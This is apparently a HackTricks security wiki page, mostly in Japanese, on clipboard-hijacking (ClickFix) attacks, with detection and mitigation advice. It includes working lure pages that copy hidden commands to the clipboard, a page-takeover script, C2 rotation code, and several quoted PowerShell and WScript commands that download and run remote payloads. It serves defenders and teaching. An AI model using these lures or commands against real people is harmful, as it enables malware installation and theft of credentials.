# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "自分でコピーしていないものは決して貼り付けるな。" – 古いが今でも有効な助言

## 概要

Clipboard hijacking – also known as *pastejacking* – は、ユーザがコマンドを確認せずに日常的にコピー＆ペーストするという事実を悪用します。悪意のあるウェブページ（または Electron や Desktop アプリケーションなどの JavaScript が動作する任意のコンテキスト）は、プログラム的に攻撃者が制御するテキストをシステムクリップボードに配置します。被害者は、通常は巧妙に作られたソーシャルエンジニアリングの指示により、**Win + R**（Run dialog）、**Win + X**（Quick Access / PowerShell）、あるいはターミナルを開いてクリップボードの内容を貼り付けるよう促され、即座に任意のコマンドが実行されます。

ファイルがダウンロードされず、添付ファイルが開かれないため、この手法は添付ファイル、マクロ、あるいは直接のコマンド実行を監視するほとんどのメールおよびウェブコンテンツのセキュリティ制御を回避します。そのため、この攻撃は NetSupport RAT、Latrodectus loader、Lumma Stealer といった一般的なマルウェアを配布するフィッシングキャンペーンで人気があります。

## Forced copy buttons and hidden payloads (macOS one-liners)

一部の macOS infostealers はインストーラサイト（例：Homebrew）をクローンし、ユーザが表示されているテキストだけを選択できないように **「Copy」ボタンの使用を強制** します。クリップボードには期待されるインストーラコマンドに加えて Base64 でエンコードされたペイロードが追記され（例：`...; echo <b64> | base64 -d | sh`）、単一の貼り付けで両方が実行され、UI は追加段階を隠します。

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
以前のキャンペーンでは `document.execCommand('copy')` が使われていましたが、最近のものは非同期の **Clipboard API** (`navigator.clipboard.writeText`) に依存しています。

## The ClickFix / ClearFake Flow

1. ユーザーがタイポスクワットされた、または侵害されたサイト（例: `docusign.sa[.]com`）を訪れます。
2. 注入された **ClearFake** JavaScript が `unsecuredCopyToClipboard()` ヘルパーを呼び出し、クリップボードに Base64でエンコードされた PowerShell のワンライナーを密かに保存します。
3. HTML の指示により被害者は *“**Win + R** を押し、コマンドを貼り付けて Enter を押すと問題が解決されます。”*
4. `powershell.exe` が実行され、正当な実行ファイルと悪意のある DLL を含むアーカイブをダウンロードする（classic DLL sideloading）。
5. ローダーは追加ステージを復号化し、shellcode を注入し、persistence（例: scheduled task）をインストールする — 最終的に NetSupport RAT / Latrodectus / Lumma Stealer を実行する。

### NetSupport RAT チェーンの例
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe`（正当な Java WebStart）は自身のディレクトリ内で `msvcp140.dll` を検索します。
* 悪意のある DLL は **GetProcAddress** で API を動的に解決し、**curl.exe** を介して 2 つのバイナリ（`data_3.bin`, `data_4.bin`）をダウンロードし、rolling XOR key `"https://google.com/"` を使ってそれらを復号して最終的な shellcode を注入し、**client32.exe** (NetSupport RAT) を `C:\ProgramData\SecurityCheck_v1\` に解凍します。

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. **curl.exe**で`la.txt`をダウンロードする
2. **cscript.exe**内でJScript downloaderを実行する
3. MSI payloadを取得 → 署名されたアプリケーションの横に`libcef.dll`を配置 → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer via MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
The **mshta** call launches a hidden PowerShell script that retrieves `PartyContinued.exe`, extracts `Boat.pst` (CAB), reconstructs `AutoIt3.exe` through `extrac32` & file concatenation and finally runs an `.a3x` script which exfiltrates browser credentials to `sumeriavgv.digital`.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Some ClickFix campaigns skip file downloads entirely and instruct victims to paste a one‑liner that fetches and executes JavaScript via WSH, persists it, and rotates C2 daily. Example observed chain:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
主な特徴
- 難読化された URL は実行時に反転され、表面的な検査を回避します。
- JavaScript は Startup LNK (WScript/CScript) を介して自身を永続化し、当日に応じて C2 を選択します — これにより迅速な domain rotation が可能になります。

日付で C2 を回転するために使用される最小限の JS フラグメント:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
次の段階では、永続化を確立し RAT (例: PureHVNC) を取得するローダーがよく展開され、しばしば TLS をハードコードされた証明書にピン止めし、トラフィックをチャンク化します。

Detection ideas specific to this variant
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (or `cscript.exe`).
- Startup artifacts: `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` にある LNK が WScript/CScript を呼び出し、JS パスが `%TEMP%`/`%APPDATA%` の下にある場合。
- Registry/RunMRU やコマンドラインのテレメトリに `.split('').reverse().join('')` や `eval(a.responseText)` を含む。
- 長いコマンドラインを避けるために、大きな stdin ペイロードを渡して何度も `powershell -NoProfile -NonInteractive -Command -` が使用される。
- 更新プログラム風のタスク/パス（例: `\GoogleSystem\GoogleUpdater`）の下で、後続で `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` のような LOLBins を実行する Scheduled Task。

Threat hunting
- 日替わりで回転する C2 ホスト名や URL で、`.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` パターンを持つもの。
- クリップボード書き込みイベントに続き Win+R で貼り付け、即座に `powershell.exe` が実行されるイベントを相関付ける。

Blue-teams can combine clipboard, process-creation and registry telemetry to pinpoint pastejacking abuse:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` は **Win + R** コマンドの履歴を保持します — 不審な Base64 や難読化されたエントリを確認してください。
* Security Event ID **4688**（プロセス作成）で `ParentImage` == `explorer.exe` かつ `NewProcessName` が { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` } に含まれるケースを探す。
* 疑わしい 4688 イベントの直前に、`%LocalAppData%\Microsoft\Windows\WinX\` または一時フォルダ下でのファイル作成を示す Event ID **4663**。
* EDR の clipboard センサー（存在する場合） — `Clipboard Write` の直後に新しい PowerShell プロセスが発生しているかを相関付ける。

## IUAM-style 検証ページ (ClickFix Generator): クリップボードからコンソールへコピー + OS 判別ペイロード

最近のキャンペーンでは、偽の CDN/ブラウザ検証ページ（"Just a moment…", IUAM-style）を大量に生成し、ユーザに OS 固有のコマンドをクリップボードからネイティブコンソールへコピーさせることで強制します。これにより実行がブラウザのサンドボックス外へピボットし、Windows と macOS の両方で動作します。

Key traits of the builder-generated pages
- `navigator.userAgent` による OS 検出でペイロードを適合させる（Windows PowerShell/CMD と macOS Terminal の使い分け）。サポート外の OS にはオプションでデコイ/無操作を示して幻想を保つ。
- 表示されるテキストとクリップボードの内容が異なる場合がある一方で、（チェックボックスや Copy ボタンなど）無害な UI 操作で自動的にクリップボードにコピーする。
- モバイルをブロックし、手順を示すポップオーバーを表示：Windows → Win+R→貼り付け→Enter；macOS → Terminal を開く→貼り付け→Enter。
- 任意での難読化と単一ファイルのインジェクタにより、侵害されたサイトの DOM を Tailwind スタイルの検証 UI で上書きする（新しいドメイン登録は不要）。

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS persistence of the initial run
- `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` を使用して、ターミナルが閉じた後も実行を継続させ、目に見える痕跡を減らす。

In-place page takeover on compromised sites
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
IUAMスタイルのルアーに特化した検知・ハンティングのアイデア
- Web: Clipboard API を検証ウィジェットにバインドするページ；表示されているテキストとクリップボードのペイロードの不一致；`navigator.userAgent` による分岐；怪しい文脈で Tailwind と single-page の差し替え。
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` がブラウザ操作の直後に起動；batch/MSI installers が `%TEMP%` から実行される。
- macOS endpoint: Terminal/iTerm がブラウザイベント付近で `bash`/`curl`/`base64 -d` を `nohup` 付きで起動；ターミナルを閉じても生き残るバックグラウンドジョブ。
- `RunMRU`（Win+R）履歴とクリップボード書き込みを、その後のコンソールプロセス生成と相関させる。

See also for supporting techniques

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 fake CAPTCHA / ClickFix evolutions (ClearFake, Scarlet Goldfinch)

- ClearFake は WordPress サイトを継続的に侵害し、loader JavaScript を注入して外部ホスト（Cloudflare Workers、GitHub/jsDelivr）やブロックチェーンの“etherhiding”呼び出し（例：`bsc-testnet.drpc[.]org` のような Binance Smart Chain API への POST）をチェーンして現在のルアーロジックを取得している。最近のオーバーレイは、何かをダウンロードさせる代わりにワンライナーのコピー＆ペースト（T1204.004）を指示する偽CAPTCHAを多用している。
- 初期実行は署名されたスクリプトホスト/LOLBAS にますます委譲されている。2026年1月のチェーンでは以前の `mshta` の利用を止め、組み込みの `SyncAppvPublishingServer.vbs` を `WScript.exe` 経由で実行し、PowerShell-like な引数をエイリアス/ワイルドカード付きで渡してリモートコンテンツを取得するように置き換えられた：
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` は署名されており通常は App-V によって使用されます；`WScript.exe` と非標準の引数（`gal`/`gcm` エイリアス、ワイルドカード化された cmdlets、jsDelivr URLs）と組み合わせると、ClearFake の高シグナルな LOLBAS ステージになります。
- 2026年2月、fake CAPTCHA payloads は再び純粋な PowerShell ダウンロードクレードルに移行しました。2つの実例：
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- 最初のチェーンはインメモリの `iex(irm ...)` グラバー；2つ目は `WinHttp.WinHttpRequest.5.1` 経由でステージングし、一時的な `.ps1` を書き出して隠しウィンドウで `-ep bypass` を使って起動します。

Detection/hunting tips for these variants
- Process lineage: ブラウザ → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` または PowerShell cradles が clipboard 書き込み/Win+R の直後に発生する。
- Command-line keywords: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker domains, or raw IP `iex(irm ...)` patterns.
- Network: ブラウジング直後にスクリプトホスト/PowerShell から CDN worker ホストや blockchain RPC エンドポイントへのアウトバウンド。
- File/registry: `%TEMP%` 以下への一時的な `.ps1` 作成と、これらのワンライナーを含む RunMRU エントリ；外部 URL や難読化されたエイリアス文字列を伴う signed-script LOLBAS (WScript/cscript/mshta) の実行をブロック/アラートする。

## Mitigations

1. ブラウザの強化 – クリップボード書き込みアクセスを無効化（`dom.events.asyncClipboard.clipboardItem` など）またはユーザー操作を要求する。
2. セキュリティ意識向上 – ユーザーに機密コマンドを*手入力する*か、まずテキストエディタに貼り付けるよう指導する。
3. PowerShell Constrained Language Mode / Execution Policy + Application Control により任意のワンライナーをブロックする。
4. ネットワーク制御 – 既知の pastejacking およびマルウェア C2 ドメインへのアウトバウンド要求をブロックする。

## Related Tricks

* **Discord Invite Hijacking** は、悪意あるサーバーにユーザーを誘い込んだ後、同じ ClickFix アプローチを悪用することが多い:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)

{{#include ../../banners/hacktricks-training.md}}
